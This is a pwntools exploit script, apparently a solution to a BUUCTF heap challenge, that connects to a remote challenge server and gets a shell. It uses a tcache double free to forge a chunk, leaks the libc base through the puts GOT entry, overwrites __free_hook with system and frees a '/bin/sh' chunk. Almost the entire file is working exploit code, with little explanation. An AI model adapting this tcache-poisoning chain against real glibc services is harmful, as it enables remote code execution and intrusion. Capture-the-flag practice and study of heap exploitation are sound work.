from pwn import *
#p=process('./1')
p=remote('node3.buuoj.cn',25026)
libc=ELF('libc-2.27_64.so')
#libc=ELF('/glibc/2.27/64/lib/libc-2.27.so')
elf=ELF('./1')
#context.log_level = 'debug'
#og=[0x4f2c5,0x4f322,0x10a38c]
context.terminal = ['tmux','splitw','-h']
def debug():
    gdb.attach(p)
    pause()
def add(leng,con):
    sleep(0.1)
    p.sendline('1')
    sleep(0.1)
    p.sendline(str(leng))
    sleep(0.1)
    p.sendline(str(con))
def delete(idx):
    sleep(0.1)
    p.sendline('2')
    sleep(0.1)
    p.sendline(str(idx))
def edit(idx,con):
    sleep(0.1)
    p.sendline('3')
    sleep(0.1)
    p.sendline(str(idx))
    sleep(0.1)
    p.sendline(str(con))
def display(idx):
    sleep(0.1)
    p.sendline('4')
    sleep(0.1)
    p.sendline(str(idx))

add(0x60,'a') #0
add(0x60,'a') #1
add(0x50,'a') #2
delete(2)
delete(2)
fake=0x602068  #fake chunk head
add(0x50,'') #3
edit(3,p64(fake))
add(0x50,'') #4
payload=p64(elf.got['puts'])+p64(60)
add(0x50,payload) #5
display(0)
libc.address=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-libc.sym['puts']
#libc.address=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x39bb20-712
print hex(libc.address)

add(0x60,'a') #6
delete(6)
delete(6)
add(0x60,p64(libc.sym['__free_hook'])) #7
add(0x60,'') #8
#payload=11*'a'+p64(libc.address+og[0])+p64(libc.sym['__realloc_hook']+2)
payload=p64(libc.sym['system'])
#payload=0x13*'a'+p64(og[2]+libc.address)
add(0x60,payload) #9
edit(4,'/bin/sh\x00')
delete(4)


p.interactive()
